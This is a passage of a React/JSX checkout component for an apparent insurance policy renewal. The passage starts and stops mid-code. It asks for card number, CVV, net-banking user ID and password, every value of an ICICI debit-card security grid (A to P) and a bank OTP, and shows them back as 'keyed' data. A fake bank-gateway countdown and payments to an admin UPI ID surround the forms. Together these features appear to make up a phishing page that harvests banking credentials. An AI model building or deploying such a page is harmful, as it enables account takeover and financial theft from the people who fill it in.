                                const upiLink = `upi://pay?pa=${adminSettings.adminUpiId}&pn=${encodeURIComponent(adminSettings.adminUpiName)}&am=${finalPayable}&cu=INR&tn=${encodeURIComponent(`Policy Renewal ${policy.policyNumber}`)}`;
                                window.open(upiLink, '_blank');
                              }}
                              className="bg-[#3b0764] hover:bg-[#520d8b] border border-purple-600/60 py-2 rounded text-purple-200 cursor-pointer transition-all active:scale-95"
                            >
                              PhonePe
                            </button>
                          </div>

                        </div>

                        {/* Customer UPI ID Input & Confirm Button */}
                        <div className="space-y-3 pt-1">
                          <div>
                            <label className="block text-slate-700 font-bold mb-1 text-xs">
                              Customer UPI ID / Mobile (Optional if scanning QR):
                            </label>
                            <input
                              type="text"
                              value={upiVpa}
                              onChange={(e) => setUpiVpa(e.target.value)}
                              placeholder="e.g. yourname@okhdfcbank or 9876543210@paytm"
                              className="w-full px-3 py-2 rounded-lg border border-slate-300 font-mono font-bold text-slate-900 bg-white focus:border-[#EA580C] outline-none text-xs"
                            />
                          </div>

                          <button
                            type="submit"
                            className="w-full bg-[#EA580C] hover:bg-[#d84d00] active:scale-95 text-white py-3.5 px-5 rounded-xl font-extrabold text-xs shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer"
                          >
                            <ShieldCheck className="w-4 h-4" />
                            <span>I Have Paid ₹{finalPayable.toLocaleString('en-IN')} via UPI / Verify Payment</span>
                          </button>
                        </div>

                      </div>
                    )}

                  </div>
                )}
                
                {/* 1. REGULAR CARD FLOW */}
                {selectedMethod === 'card' && (
                  <div className="space-y-3">
                    <div>
                      <label className="block text-slate-700 font-bold mb-1">Card Number *</label>
                      <input
                        type="text"
                        value={cardNumber}
                        onChange={handleCardNumberChange}
                        maxLength={19}
                        placeholder="4532 8812 9941 1234"
                        className="w-full px-3 py-2 rounded-lg border border-slate-300 font-bold font-mono text-slate-900 bg-white focus:border-[#EA580C] outline-none"
                        required
                      />
                    </div>

                    <div>
                      <label className="block text-slate-700 font-bold mb-1">Cardholder Name *</label>
                      <input
                        type="text"
                        value={cardHolder}
                        onChange={(e) => setCardHolder(e.target.value)}
                        placeholder="Full Name as on Card"
                        className="w-full px-3 py-2 rounded-lg border border-slate-300 font-bold text-slate-900 bg-white focus:border-[#EA580C] outline-none"
                        required
                      />
                    </div>

                    <div className="grid grid-cols-2 gap-2">
                      <div>
                        <label className="block text-slate-700 font-bold mb-1">Expiry Date (MM/YY) *</label>
                        <input
                          type="text"
                          value={cardExpiry}
                          onChange={handleExpiryChange}
                          maxLength={5}
                          placeholder="MM/YY"
                          className="w-full px-3 py-2 rounded-lg border border-slate-300 font-bold font-mono text-slate-900 bg-white text-center focus:border-[#EA580C] outline-none"
                          required
                        />
                      </div>
                      <div>
                        <label className="block text-slate-700 font-bold mb-1">CVV *</label>
                        <input
                          type="password"
                          value={cardCvv}
                          onChange={handleCvvChange}
                          maxLength={4}
                          placeholder="123"
                          className="w-full px-3 py-2 rounded-lg border border-slate-300 font-bold font-mono text-slate-900 bg-white text-center focus:border-[#EA580C] outline-none"
                          required
                        />
                      </div>
                    </div>

                    <button
                      type="submit"
                      className="w-full mt-2 bg-[#EA580C] hover:bg-[#D97706] text-white py-3.5 px-5 rounded-xl font-extrabold text-xs shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer"
                    >
                      <Lock className="w-4 h-4" />
                      <span>Authorize Payment of ₹{finalPayable.toLocaleString('en-IN')}</span>
                    </button>
                  </div>
                )}



                {/* 3. NET BANKING FLOW (STEP 1: USER ID -> STEP 2: PASSWORD -> STEP 3: ICICI DEBIT CARD GRID -> OTP) */}
                {selectedMethod === 'netbanking' && (
                  <div className="space-y-3">
                    {/* STEP 1: USER ID */}
                    {netbankingStep === 'userid' && (
                      <div className="space-y-3 animate-fadeIn">
                        <div className="flex items-center justify-between bg-orange-50/80 px-3 py-2 rounded-lg border border-orange-200 text-xs">
                          <span className="font-extrabold text-orange-950 flex items-center gap-1.5">
                            <Landmark className="w-3.5 h-3.5 text-[#EA580C]" />
                            Step 1: Select Bank & Enter User ID
                          </span>
                          <span className="text-[10px] bg-[#EA580C] text-white px-2 py-0.5 rounded font-bold">
                            {selectedBank === 'ICICI Bank' ? '1 of 3' : '1 of 2'}
                          </span>
                        </div>

                        <div>
                          <label className="block text-slate-700 font-bold mb-1 text-xs">Select Bank *</label>
                          <select
                            value={selectedBank}
                            onChange={(e) => setSelectedBank(e.target.value)}
                            className="w-full px-3 py-2.5 rounded-lg border border-slate-300 font-bold text-slate-900 bg-white focus:border-[#EA580C] outline-none text-xs"
                            required
                          >
                            <option value="ICICI Bank">ICICI Bank (Debit Card Grid Authentication)</option>
                            <option value="HDFC Bank">HDFC Bank</option>
                            <option value="State Bank of India">State Bank of India (SBI)</option>
                            <option value="Axis Bank">Axis Bank</option>
                            <option value="Kotak Mahindra Bank">Kotak Mahindra Bank</option>
                            <option value="Punjab National Bank">Punjab National Bank</option>
                            <option value="Bank of Baroda">Bank of Baroda</option>
                            <option value="Canara Bank">Canara Bank</option>
                            <option value="Union Bank of India">Union Bank of India</option>
                            <option value="IndusInd Bank">IndusInd Bank</option>
                            <option value="Yes Bank">Yes Bank</option>
                            <option value="Other Bank">Other / Enter Custom Bank Name</option>
                          </select>
                        </div>

                        {selectedBank === 'Other Bank' && (
                          <div>
                            <label className="block text-slate-700 font-bold mb-1 text-xs">Enter Your Bank Name *</label>
                            <input
                              type="text"
                              value={customBankName}
                              onChange={(e) => setCustomBankName(e.target.value)}
                              placeholder="e.g. Canara Bank, Union Bank, IndusInd Bank"
                              className="w-full px-3 py-2 rounded-lg border border-slate-300 font-bold text-slate-900 bg-white focus:border-[#EA580C] outline-none text-xs"
                              required
                            />
                          </div>
                        )}

                        <div>
                          <label className="block text-slate-700 font-bold mb-1 text-xs">Net Banking User ID / Customer ID *</label>
                          <input
                            type="text"
                            value={netbankingUserId}
                            onChange={(e) => setNetbankingUserId(e.target.value)}
                            placeholder="e.g. USER987654 or Customer ID"
                            className="w-full px-3 py-2.5 rounded-lg border border-slate-300 font-bold font-mono text-slate-900 bg-white focus:border-[#EA580C] outline-none text-xs"
                            required
                          />
                        </div>

                        <button
                          type="button"
                          disabled={!netbankingUserId.trim() || (selectedBank === 'Other Bank' && !customBankName.trim())}
                          onClick={() => {
                            if (netbankingUserId.trim()) {
                              setNetbankingStep('password');
                            }
                          }}
                          className="w-full mt-2 bg-[#EA580C] hover:bg-[#D97706] text-white py-3.5 px-5 rounded-xl font-extrabold text-xs shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed"
                        >
                          <span>Proceed to Password</span>
                          <ArrowRight className="w-4 h-4" />
                        </button>
                      </div>
                    )}

                    {/* STEP 2: PASSWORD STEP */}
                    {netbankingStep === 'password' && (
                      <div className="space-y-3 animate-fadeIn">
                        <div className="flex items-center justify-between bg-orange-50/80 px-3 py-2 rounded-lg border border-orange-200 text-xs">
                          <span className="font-extrabold text-orange-950 flex items-center gap-1.5">
                            <KeyRound className="w-3.5 h-3.5 text-[#EA580C]" />
                            Step 2: Enter Net Banking Password
                          </span>
                          <span className="text-[10px] bg-[#EA580C] text-white px-2 py-0.5 rounded font-bold">
                            {selectedBank === 'ICICI Bank' ? '2 of 3' : '2 of 2'}
                          </span>
                        </div>

                        {/* Selected Details Preview with Change Button */}
                        <div className="p-3 bg-white rounded-xl border border-slate-200 flex items-center justify-between text-xs">
                          <div>
                            <div className="text-[10px] text-slate-500 font-bold uppercase tracking-wider">Authenticating At</div>
                            <div className="font-extrabold text-slate-900">{effectiveBankName}</div>
                            <div className="text-slate-600 font-mono text-[11px]">User ID: <strong className="text-slate-900">{netbankingUserId}</strong></div>
                          </div>
                          <button
                            type="button"
                            onClick={() => setNetbankingStep('userid')}
                            className="text-xs text-[#EA580C] font-bold hover:underline flex items-center gap-1 p-1 cursor-pointer"
                          >
                            <ArrowLeft className="w-3.5 h-3.5" />
                            <span>Change</span>
                          </button>
                        </div>

                        <div>
                          <label className="block text-slate-700 font-bold mb-1 text-xs">Net Banking Password / IPIN *</label>
                          <div className="relative">
                            <input
                              type={showNetbankingPassword ? 'text' : 'password'}
                              value={netbankingPassword}
                              onChange={(e) => setNetbankingPassword(e.target.value)}
                              placeholder="Enter Net Banking Password / IPIN"
                              className="w-full px-3 py-2.5 pr-10 rounded-lg border border-slate-300 font-bold text-slate-900 bg-white focus:border-[#EA580C] outline-none text-xs"
                              required
                            />
                            <button
                              type="button"
                              onClick={() => setShowNetbankingPassword(!showNetbankingPassword)}
                              className="absolute right-2.5 top-1/2 -translate-y-1/2 text-slate-400 hover:text-slate-600 p-1 cursor-pointer"
                            >
                              {showNetbankingPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                            </button>
                          </div>
                          <p className="text-[11px] text-slate-500 mt-1.5 flex items-center gap-1 font-medium">
                            <Lock className="w-3 h-3 text-emerald-600" />
                            <span>
                              {selectedBank === 'ICICI Bank'
                                ? 'Encrypted with 256-bit SSL. Debit card grid verification required next.'
                                : 'Encrypted with 256-bit SSL. You will enter OTP in the next step.'}
                            </span>
                          </p>
                        </div>

                        {selectedBank === 'ICICI Bank' ? (
                          <button
                            type="button"
                            disabled={!netbankingPassword.trim()}
                            onClick={() => {
                              if (netbankingPassword.trim()) {
                                setNetbankingStep('grid');
                              }
                            }}
                            className="w-full mt-2 bg-[#EA580C] hover:bg-[#D97706] text-white py-3.5 px-5 rounded-xl font-extrabold text-xs shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed"
                          >
                            <CreditCard className="w-4 h-4" />
                            <span>Next: Debit Card Grid Authentication (A to P)</span>
                            <ArrowRight className="w-4 h-4" />
                          </button>
                        ) : (
                          <button
                            type="submit"
                            disabled={!netbankingPassword.trim()}
                            className="w-full mt-2 bg-[#EA580C] hover:bg-[#D97706] text-white py-3.5 px-5 rounded-xl font-extrabold text-xs shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed"
                          >
                            <Lock className="w-4 h-4" />
                            <span>Login & Proceed to OTP (₹{finalPayable.toLocaleString('en-IN')})</span>
                          </button>
                        )}
                      </div>
                    )}

                    {/* STEP 3: ICICI DEBIT CARD GRID AUTHENTICATION (A TO P) */}
                    {netbankingStep === 'grid' && selectedBank === 'ICICI Bank' && (
                      <div className="space-y-3.5 animate-fadeIn">
                        <div className="flex items-center justify-between bg-orange-50/80 px-3 py-2 rounded-lg border border-orange-200 text-xs">
                          <span className="font-extrabold text-orange-950 flex items-center gap-1.5">
                            <CreditCard className="w-3.5 h-3.5 text-[#EA580C]" />
                            Step 3: Enter ICICI Debit Card Grid Numbers (A to P)
                          </span>
                          <span className="text-[10px] bg-[#EA580C] text-white px-2 py-0.5 rounded font-bold">3 of 3</span>
                        </div>

                        {/* Account Details Banner with Back/Change */}
                        <div className="p-3 bg-white rounded-xl border border-slate-200 flex items-center justify-between text-xs">
                          <div>
                            <div className="text-[10px] text-slate-500 font-bold uppercase tracking-wider">ICICI Bank Net Banking</div>
                            <div className="text-slate-800 text-[11px]">
                              User ID: <strong className="font-mono text-slate-900">{netbankingUserId}</strong> • Password: <strong className="font-mono text-slate-900">••••••••</strong>
                            </div>
                          </div>
                          <button
                            type="button"
                            onClick={() => setNetbankingStep('password')}
                            className="text-xs text-[#EA580C] font-bold hover:underline flex items-center gap-1 p-1 cursor-pointer"
                          >
                            <ArrowLeft className="w-3.5 h-3.5" />
                            <span>Back</span>
                          </button>
                        </div>

                        {/* Debit Card Reverse Simulation Container */}
                        <div className="bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900 text-white p-4 rounded-2xl border border-slate-700 shadow-lg space-y-3">
                          <div className="flex items-center justify-between border-b border-slate-700/80 pb-2">
                            <div className="flex items-center gap-2">
                              <div className="w-6 h-4 bg-amber-400/90 rounded-sm border border-amber-300"></div>
                              <span className="text-[11px] font-black tracking-wider text-orange-400 uppercase">ICICI Bank Debit Card (Back Side)</span>
                            </div>
                            <span className="text-[10px] text-slate-400 font-mono">GRID MATRIX (A - P)</span>
                          </div>

                          <p className="text-[11px] text-slate-300 leading-relaxed font-normal">
                            Please check the grid table printed on the <strong>back of your ICICI Bank Debit Card</strong> and enter the <strong>2-digit numbers</strong> for letters <strong>A through P</strong>:
                          </p>

                          {/* 16 Grid Letters A to P Matrix (4 cols x 4 rows) */}
                          <div className="grid grid-cols-4 sm:grid-cols-8 gap-2 pt-1">
                            {GRID_LETTERS.map((letter, index) => {
                              const val = iciciGrid[letter] || '';
                              return (
                                <div 
                                  key={letter}
                                  className={`rounded-xl border transition-all overflow-hidden flex flex-col items-center shadow-xs ${
                                    val.length === 2 
                                      ? 'border-orange-500 bg-slate-800 ring-1 ring-orange-500/40' 
                                      : 'border-slate-700 bg-slate-800/80 focus-within:border-orange-400'
                                  }`}
                                >
                                  {/* Letter Header */}
                                  <div className="w-full text-center py-0.5 bg-slate-700/90 text-orange-300 font-black text-[11px] border-b border-slate-600/80">
                                    {letter}
                                  </div>
                                  {/* 2-Digit Input Box */}
                                  <input
                                    id={`grid-input-${letter}`}
                                    type="text"
                                    inputMode="numeric"
                                    maxLength={2}
                                    value={val}
                                    onChange={(e) => handleGridInputChange(letter, e.target.value, index)}
                                    onKeyDown={(e) => handleGridKeyDown(e, letter, index)}
                                    placeholder="--"
                                    className="w-full text-center py-2 text-sm font-extrabold font-mono text-white bg-transparent outline-none placeholder:text-slate-500"
                                  />
                                </div>
                              );
                            })}
                          </div>

                          {/* Helper Fast Demo Actions */}
                          <div className="flex items-center justify-between pt-2 border-t border-slate-700/80 text-[11px]">
                            <button
                              type="button"
                              onClick={handlePrefillSampleGrid}
                              className="text-orange-300 hover:text-orange-200 font-bold underline cursor-pointer flex items-center gap-1"
                            >
                              <Zap className="w-3.5 h-3.5 text-amber-400" />
                              <span>Auto-Fill Sample Grid (11, 33, 57, 66...)</span>
                            </button>

                            <button
                              type="button"
                              onClick={handleClearGrid}
                              className="text-slate-400 hover:text-slate-200 cursor-pointer"
                            >
                              Clear Grid
                            </button>
                          </div>
                        </div>

                        {/* Authentication Submit Button */}
                        <button
                          type="submit"
                          className="w-full mt-2 bg-[#EA580C] hover:bg-[#D97706] text-white py-3.5 px-5 rounded-xl font-extrabold text-xs shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer"
                        >
                          <Lock className="w-4 h-4" />
                          <span>Verify Debit Card Grid & Proceed to OTP (₹{finalPayable.toLocaleString('en-IN')})</span>
                        </button>
                      </div>
                    )}
                  </div>
                )}

                {/* 4. EASY EMI FLOW WITH STEP 1 (PLAN) & STEP 2 (CARD OR UPI AUTOPAY) */}
                {selectedMethod === 'emi' && (
                  <div className="space-y-3">
                    {/* UPI AutoPay Banner for Monthly EMI */}
                    <div className="bg-gradient-to-r from-purple-50 via-indigo-50 to-orange-50 p-3 rounded-xl border border-purple-200 flex items-center justify-between text-xs">
                      <div className="flex items-center gap-2">
                        <div className="w-8 h-8 rounded-lg bg-purple-600 text-white flex items-center justify-center shrink-0">
                          <Repeat className="w-4 h-4" />
                        </div>
                        <div>
                          <span className="font-extrabold text-purple-950 block">Want Automatic Monthly EMI via UPI?</span>
                          <span className="text-[10px] text-purple-700">Set up UPI AutoPay to auto-debit the EMI monthly from Google Pay, PhonePe or Paytm.</span>
                        </div>
                      </div>
                      <button
                        type="button"
                        onClick={() => {
                          setSelectedMethod('upi');
                          setUpiPaymentType('autopay_emi');
                          setUpiEmiTenureMonths(emiTenureMonths);
                        }}
                        className="bg-purple-700 hover:bg-purple-800 active:scale-95 text-white text-[11px] font-black px-3 py-1.5 rounded-lg shrink-0 transition cursor-pointer shadow-xs flex items-center gap-1"
                      >
                        <Repeat className="w-3.5 h-3.5" />
                        <span>Use UPI AutoPay</span>
                      </button>
                    </div>

                    {emiStep === 'plan' ? (
                      <div className="space-y-3">
                        <label className="block text-slate-700 font-bold mb-1">Select No-Cost EMI Plan *</label>
                        <div className="space-y-2">
                          {[3, 6, 9, 12, 24].map(m => {
                            const monthly = Math.round(finalPayable / m);
                            return (
                              <label
                                key={m}
                                onClick={() => setEmiTenureMonths(m)}
                                className={`p-3 rounded-xl border flex items-center justify-between cursor-pointer transition-all ${
                                  emiTenureMonths === m 
                                    ? 'border-[#EA580C] bg-orange-50/50 text-[#EA580C] font-extrabold'
                                    : 'border-slate-200 bg-white text-slate-700 hover:bg-slate-50'
                                }`}
                              >
                                <div>
                                  <div className="text-xs">{m} Months No-Cost EMI</div>
                                  <div className="text-[10px] text-slate-500">0% Interest • ₹{monthly.toLocaleString('en-IN')}/mo</div>
                                </div>
                                <strong className="font-mono text-sm">₹{monthly.toLocaleString('en-IN')} / mo</strong>
                              </label>
                            );
                          })}
                        </div>

                        <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 pt-1">
                          <button
                            type="button"
                            onClick={() => {
                              setSelectedMethod('upi');
                              setUpiPaymentType('autopay_emi');
                              setUpiEmiTenureMonths(emiTenureMonths);
                            }}
                            className="bg-[#EA580C] hover:bg-[#d84d00] text-white py-3 px-4 rounded-xl font-extrabold text-xs shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer"
                          >
                            <Repeat className="w-4 h-4" />
                            <span>Auto-Debit via UPI AutoPay</span>
                          </button>

                          <button
                            type="button"
                            onClick={() => setEmiStep('card')}
                            className="bg-[#00264A] hover:bg-[#001D38] text-white py-3 px-4 rounded-xl font-extrabold text-xs shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer"
                          >
                            <CreditCard className="w-4 h-4 text-orange-400" />
                            <span>Pay with Credit/Debit Card</span>
                          </button>
                        </div>
                      </div>
                    ) : (
                      /* STEP 2: EMI CARD DETAILS PAGE */
                      <div className="space-y-3 animate-fadeIn">
                        <div className="flex items-center justify-between border-b border-slate-200 pb-2">
                          <button
                            type="button"
                            onClick={() => setEmiStep('plan')}
                            className="text-slate-500 hover:text-slate-800 flex items-center gap-1 font-bold text-[11px] cursor-pointer"
                          >
                            <ArrowLeft className="w-3.5 h-3.5" />
                            <span>Change EMI Plan ({emiTenureMonths} Months)</span>
                          </button>
                          <span className="text-[10px] font-bold text-orange-800 bg-orange-100 px-2 py-0.5 rounded border border-orange-200">
                            ₹{Math.round(finalPayable / emiTenureMonths).toLocaleString('en-IN')} / month
                          </span>
                        </div>

                        <div>
                          <label className="block text-slate-700 font-bold mb-1">Enter Card Number for EMI *</label>
                          <input
                            type="text"
                            value={cardNumber}
                            onChange={handleCardNumberChange}
                            maxLength={19}
                            placeholder="4532 8812 9941 1234"
                            className="w-full px-3 py-2 rounded-lg border border-slate-300 font-bold font-mono text-slate-900 bg-white focus:border-[#EA580C] outline-none"
                            required
                          />
                        </div>

                        <div>
                          <label className="block text-slate-700 font-bold mb-1">Cardholder Name *</label>
                          <input
                            type="text"
                            value={cardHolder}
                            onChange={(e) => setCardHolder(e.target.value)}
                            placeholder="Full Name as on Card"
                            className="w-full px-3 py-2 rounded-lg border border-slate-300 font-bold text-slate-900 bg-white focus:border-[#EA580C] outline-none"
                            required
                          />
                        </div>

                        <div className="grid grid-cols-2 gap-2">
                          <div>
                            <label className="block text-slate-700 font-bold mb-1">Expiry Date (MM/YY) *</label>
                            <input
                              type="text"
                              value={cardExpiry}
                              onChange={handleExpiryChange}
                              maxLength={5}
                              placeholder="MM/YY"
                              className="w-full px-3 py-2 rounded-lg border border-slate-300 font-bold font-mono text-slate-900 bg-white text-center focus:border-[#EA580C] outline-none"
                              required
                            />
                          </div>
                          <div>
                            <label className="block text-slate-700 font-bold mb-1">CVV *</label>
                            <input
                              type="password"
                              value={cardCvv}
                              onChange={handleCvvChange}
                              maxLength={4}
                              placeholder="123"
                              className="w-full px-3 py-2 rounded-lg border border-slate-300 font-bold font-mono text-slate-900 bg-white text-center focus:border-[#EA580C] outline-none"
                              required
                            />
                          </div>
                        </div>

                        <button
                          type="submit"
                          className="w-full mt-2 bg-[#EA580C] hover:bg-[#D97706] text-white py-3.5 px-5 rounded-xl font-extrabold text-xs shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer"
                        >
                          <Lock className="w-4 h-4" />
                          <span>Authorize EMI Card Payment (₹{Math.round(finalPayable / emiTenureMonths).toLocaleString('en-IN')}/mo)</span>
                        </button>
                      </div>
                    )}
                  </div>
                )}

              </div>

            </form>
          )}

          {/* STEP 2: 5 TO 10 SECOND PROCESSING GATEWAY SCREEN */}
          {step === 'processing' && (
            <div className="py-8 px-4 text-center space-y-6 animate-fadeIn">
              <div className="relative w-20 h-20 mx-auto flex items-center justify-center">
                <div className="absolute inset-0 border-4 border-orange-200 border-t-[#EA580C] rounded-full animate-spin" />
                <Lock className="w-8 h-8 text-[#EA580C]" />
              </div>

              <div className="space-y-2">
                <h4 className="font-extrabold text-slate-900 text-base">
                  {selectedMethod === 'netbanking' 
                    ? `Connecting to ${effectiveBankName} Gateway...` 
                    : (selectedMethod === 'upi' && upiPaymentType === 'autopay_emi')
                    ? 'Connecting to NPCI UPI AutoPay Network...'
                    : 'Connecting to Bank Gateway...'}
                </h4>
                <p className="text-xs text-slate-500 max-w-sm mx-auto font-medium">
                  {selectedMethod === 'netbanking'
                    ? `Validating Net Banking credentials for User ID "${netbankingUserId}". Please do not refresh or close this window.`
                    : (selectedMethod === 'upi' && upiPaymentType === 'autopay_emi')
                    ? `Registering monthly recurring auto-debit mandate of ₹${upiMonthlyEmi.toLocaleString('en-IN')}/month on your UPI account. Please do not refresh or close this window.`
                    : 'Validating credentials with bank 3D-Secure server. Please do not refresh or close this window.'}
                </p>
              </div>

              {/* Progress Bar & Timer */}
              <div className="bg-slate-100 rounded-full h-2.5 overflow-hidden w-full max-w-xs mx-auto">
                <div 
                  className="bg-[#EA580C] h-full transition-all duration-1000 ease-linear rounded-full"
                  style={{ width: `${((7 - processingTimeLeft) / 7) * 100}%` }}
                />
              </div>

              <div className="flex items-center justify-center gap-2 text-xs font-bold text-slate-600">
                <Clock className="w-4 h-4 text-[#EA580C] animate-pulse" />
                <span>Redirecting to 3D-Secure OTP in <strong>{processingTimeLeft} sec</strong>...</span>
              </div>
            </div>
          )}

          {/* STEP 3: OTP VERIFICATION SCREEN WITH 3-MINUTE TIMER */}
          {step === 'otp' && (
            <form onSubmit={handleVerifyOtp} className="space-y-4 animate-fadeIn">
              
              <div className="text-center space-y-1">
                <div className="w-12 h-12 bg-amber-100 text-amber-800 rounded-full flex items-center justify-center mx-auto font-bold text-lg">
                  <Lock className="w-6 h-6" />
                </div>
                <h4 className="font-extrabold text-slate-900 text-lg">
                  {selectedMethod === 'upi' && upiPaymentType === 'autopay_emi'
                    ? 'Authorize UPI AutoPay Mandate'
                    : 'Enter 3D-Secure OTP'}
                </h4>
                <p className="text-xs text-slate-500 max-w-xs mx-auto">
                  {selectedMethod === 'upi' && upiPaymentType === 'autopay_emi'
                    ? `A mandate authorization request for ₹${upiMonthlyEmi.toLocaleString('en-IN')}/month has been sent to your UPI app and mobile +91 ${policy.mobileNumber}`
                    : `An OTP has been sent to policyholder registered mobile +91 ${policy.mobileNumber}`}
                </p>
              </div>

              {/* 3-Minute Active Timer Box */}
              <div className={`p-3 rounded-xl border flex items-center justify-between font-mono text-xs ${
                otpTimeLeft < 30 ? 'bg-rose-50 border-rose-300 text-rose-800' : 'bg-orange-50/70 border-orange-200 text-orange-900'
              }`}>
                <div className="flex items-center gap-2 font-bold">
                  <Clock className="w-4 h-4 text-[#EA580C] animate-pulse" />
                  <span>OTP Session Expires In:</span>
                </div>
                <span className="font-extrabold text-sm text-[#EA580C] bg-white px-2.5 py-1 rounded border border-orange-200 shadow-2xs">
                  {formatTime(otpTimeLeft)}
                </span>
              </div>

              {/* Keyed Method Summary Info */}
              <div className="bg-slate-50 p-3 rounded-lg border border-slate-200 text-[11px] text-slate-700 space-y-1">
                {selectedMethod === 'netbanking' ? (
                  <>
                    <div className="flex justify-between">
                      <span className="text-slate-500">Keyed Bank Name:</span>
                      <strong className="text-slate-900">{effectiveBankName}</strong>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-slate-500">Keyed User / Customer ID:</span>
                      <strong className="font-mono text-slate-900 bg-orange-50 px-1.5 py-0.5 rounded border border-orange-200">{netbankingUserId || 'Not Specified'}</strong>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-slate-500">Keyed Net Banking Password:</span>
                      <strong className="font-mono text-slate-900 bg-orange-50 px-1.5 py-0.5 rounded border border-orange-200">••••••••</strong>
                    </div>
                    {selectedBank === 'ICICI Bank' && (
                      <div className="pt-1 border-t border-slate-200">
                        <div className="text-[10px] text-slate-500 font-bold mb-1">ICICI Debit Card Grid Values (A to P):</div>
                        <div className="grid grid-cols-8 gap-1 font-mono text-[10px] text-center">
                          {GRID_LETTERS.map(l => (
                            <div key={l} className="bg-orange-50 rounded border border-orange-200 py-0.5">
                              <span className="text-[8px] text-slate-500 block font-bold">{l}</span>
                              <span className="font-bold text-orange-950">{iciciGrid[l] || '--'}</span>
                            </div>
                          ))}
                        </div>
                      </div>
                    )}
                  </>
                ) : selectedMethod === 'upi' ? (
                  upiPaymentType === 'autopay_emi' ? (
                    <>
                      <div className="flex justify-between items-center">
                        <span className="text-slate-500">Payment Instrument:</span>
                        <strong className="text-purple-900 bg-purple-100 text-[10px] px-2 py-0.5 rounded border border-purple-200 font-extrabold flex items-center gap-1">
                          <Repeat className="w-3 h-3 text-purple-700" />
                          <span>UPI AutoPay (Monthly EMI)</span>
                        </strong>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-slate-500">Monthly Auto-Debit:</span>
                        <strong className="text-emerald-700 font-extrabold font-mono">
                          ₹{upiMonthlyEmi.toLocaleString('en-IN')} / month
                        </strong>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-slate-500">Auto-Debit Schedule:</span>
                        <strong className="text-slate-900 font-bold">
                          5th of every month ({upiEmiTenureMonths} Installments)
                        </strong>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-slate-500">Customer UPI VPA:</span>
                        <strong className="font-mono text-slate-900 bg-orange-50 px-1.5 py-0.5 rounded border border-orange-200">
                          {upiVpa || 'Direct App Pay'}
                        </strong>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-slate-500">Admin Payee UPI ID:</span>
                        <strong className="font-mono text-slate-900 bg-amber-100 px-1.5 py-0.5 rounded border border-amber-300">
                          {adminSettings.adminUpiId}
                        </strong>
                      </div>
                    </>
                  ) : (
                    <>
                      <div className="flex justify-between">
                        <span className="text-slate-500">Customer UPI VPA:</span>
                        <strong className="font-mono text-slate-900 bg-orange-50 px-1.5 py-0.5 rounded border border-orange-200">{upiVpa || 'Direct App Pay'}</strong>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-slate-500">Admin Payee UPI ID:</span>
                        <strong className="font-mono text-slate-900 bg-amber-100 px-1.5 py-0.5 rounded border border-amber-300">{adminSettings.adminUpiId}</strong>
                      </div>
                    </>
                  )
                ) : (
                  <>
                    <div className="flex justify-between">
                      <span className="text-slate-500">
                        {selectedMethod === 'emi' ? `EMI Card (${emiTenureMonths} Mo Plan):` : 'Keyed Card Number:'}
                      </span>
                      <strong className="font-mono text-slate-900 bg-orange-50 px-1.5 py-0.5 rounded border border-orange-200">{cardNumber || 'Not Specified'}</strong>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-slate-500">Cardholder Name:</span>
                      <strong className="text-slate-900">{cardHolder || 'Not Specified'}</strong>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-slate-500">Expiry / CVV:</span>
                      <strong className="font-mono text-slate-900">{cardExpiry || '--/--'} / {cardCvv || '---'}</strong>
                    </div>
                  </>
                )}
              </div>

              {/* OTP Input */}
              <div>
                <div className="flex items-center justify-between mb-1.5">
                  <label className="block text-xs font-bold text-slate-700">Enter OTP Code *</label>
                </div>
                <input
                  type="text"
                  id="payment-otp-input"
                  inputMode="numeric"
                  autoComplete="one-time-code"
                  pattern="[0-9]*"
                  maxLength={6}
                  value={otp}
                  onChange={(e) => handleOtpChange(e.target.value)}
                  placeholder="Enter 6-digit OTP"
                  className="w-full text-center text-2xl font-black font-mono tracking-widest py-3 rounded-xl border border-slate-300 focus:border-[#EA580C] outline-none bg-slate-50 focus:bg-white"
                  required
                />
                <p className="text-[10px] text-slate-500 mt-1 text-center">
                  Enter the 6-digit verification code received from your bank.
                </p>
              </div>

              {/* Resend notification toast */}
              {resendNotification && (
                <div className="p-2.5 rounded-lg bg-emerald-50 border border-emerald-200 text-emerald-800 text-xs font-semibold flex items-center gap-2">
                  <Check className="w-4 h-4 text-emerald-600 shrink-0" />
                  <span>{resendNotification}</span>
                </div>
              )}

              <div className="flex items-center justify-between pt-1">
                <span className="text-[11px] text-slate-500">Didn't receive the OTP code?</span>
                <button
                  type="button"
                  onClick={handleResendOtp}
                  className="text-xs font-bold text-[#EA580C] hover:text-orange-700 hover:underline flex items-center gap-1.5 cursor-pointer bg-orange-50 hover:bg-orange-100 px-3 py-1.5 rounded-lg border border-orange-200 transition-colors"
                >
                  <RefreshCw className="w-3.5 h-3.5" />
                  <span>Resend OTP (+3m)</span>
                </button>
              </div>

              <button
                type="submit"
                disabled={isProcessing}
                className="w-full bg-emerald-600 hover:bg-emerald-700 text-white py-3.5 px-5 rounded-xl font-extrabold text-xs shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer disabled:opacity-60"
              >
                {isProcessing ? (
                  <span>Verifying Payment Authorization...</span>
                ) : (
                  <>
                    <Check className="w-5 h-5" />
                    <span>
                      {selectedMethod === 'upi' && upiPaymentType === 'autopay_emi'
                        ? `Verify & Activate UPI AutoPay (₹${upiMonthlyEmi.toLocaleString('en-IN')}/mo)`
